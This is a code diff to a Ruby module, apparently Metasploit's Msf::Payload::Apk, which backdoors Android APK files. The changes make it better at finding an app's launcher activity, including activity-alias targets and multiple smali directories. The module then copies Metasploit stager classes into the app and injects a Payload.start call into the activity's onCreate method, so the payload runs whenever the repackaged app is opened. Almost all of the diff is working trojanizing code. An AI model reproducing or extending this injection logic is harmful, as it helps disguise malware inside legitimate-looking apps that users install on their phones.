@@ -44,7 +44,10 @@ module Msf::Payload::Apk
     package = amanifest.xpath("//manifest").first['package']
     activities = amanifest.xpath("//activity|//activity-alias")
     for activity in activities
-      activityname = activity.attribute("name")
+      activityname = activity.attribute("targetActivity")
+      unless activityname
+        activityname = activity.attribute("name")
+      end
       category = activity.search('category')
       unless category
         next
@@ -52,11 +55,11 @@ module Msf::Payload::Apk
       for cat in category
         categoryname = cat.attribute('name')
         if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
-          activityname = activityname.to_s
-          unless activityname.start_with?(package)
-            activityname = package + activityname
+          name = activityname.to_s
+          if name.start_with?('.')
+            name = package + name
           end
-          return activityname
+          return name
         end
       end
     end
@@ -153,22 +156,35 @@ module Msf::Payload::Apk
     amanifest = Nokogiri::XML(f)
     f.close
 
-    print_status "Locating onCreate() hook..\n"
-
+    print_status "Locating hook point..\n"
     launcheractivity = find_launcher_activity(amanifest)
-    smalifile = "#{tempdir}/original/smali/" + launcheractivity.gsub(/\./, "/") + ".smali"
-    begin
-      activitysmali = File.read(smalifile)
-    rescue Errno::ENOENT
-      raise RuntimeError, "Unable to find hook point in #{apkfile}\n"
+    unless launcheractivity
+      raise RuntimeError, "Unable to find hookable activity in #{apkfile}\n"
+    end
+    smalifile = "#{tempdir}/original/smali*/" + launcheractivity.gsub(/\./, "/") + ".smali"
+    smalifiles = Dir.glob(smalifile)
+    for smalifile in smalifiles
+      if File.readable?(smalifile)
+        activitysmali = File.read(smalifile)
+      end
+    end
+
+    unless activitysmali
+      raise RuntimeError, "Unable to find hook point in #{smalifiles}\n"
+    end
+
+    entrypoint = ';->onCreate(Landroid/os/Bundle;)V'
+    unless activitysmali.include? entrypoint
+      raise RuntimeError, "Unable to find onCreate() in #{smalifile}\n"
     end
 
     print_status "Copying payload files..\n"
     FileUtils.mkdir_p("#{tempdir}/original/smali/com/metasploit/stage/")
     FileUtils.cp Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/Payload*.smali"), "#{tempdir}/original/smali/com/metasploit/stage/"
-    activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
-    payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
-    hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
+
+    payloadhook = entrypoint + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
+    hookedsmali = activitysmali.gsub(entrypoint, payloadhook)
+
     print_status "Loading #{smalifile} and injecting payload..\n"
     File.open(smalifile, "wb") {|file| file.puts hookedsmali }
     injected_apk = "#{tempdir}/output.apk"
